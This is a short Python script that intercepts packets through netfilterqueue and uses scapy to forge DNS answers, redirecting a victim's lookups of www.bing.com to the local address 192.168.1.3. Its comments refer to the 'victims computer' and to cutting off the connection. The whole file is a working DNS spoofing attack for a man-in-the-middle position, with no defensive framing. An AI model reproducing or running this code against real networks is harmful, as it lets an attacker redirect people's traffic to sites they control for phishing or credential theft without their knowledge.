import netfilterqueue as nf
import scapy.all as scapy

def process_packet(packet):
    # print(packet.get_payload())
    scapy_packet=scapy.IP(packet.get_payload())
    # print(scapy_packet.show())

    if scapy_packet.haslayer(scapy.DNSRR):
        qname=str(scapy_packet[scapy.DNSQR].qname)
        if "www.bing.com." in qname:
            print("[+] Spoofing Target")
            answer=scapy.DNSRR(rrname=qname,rdata="192.168.1.3")

            scapy_packet[scapy.DNS].an=answer
            scapy_packet[scapy.DNS].ancount=1

            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(bytes(scapy_packet))
    packet.accept()#forward the packets to gateway so the website can load in victims computer
    # packet.drop()#these function drops every packet it recieves and cut internet connection


queue=nf.NetfilterQueue()
queue.bind(0,process_packet)#these method is used to combine the queue i.e nfqueue with queue object of netfilterqueue
queue.run()#these function start executing the queue functionality
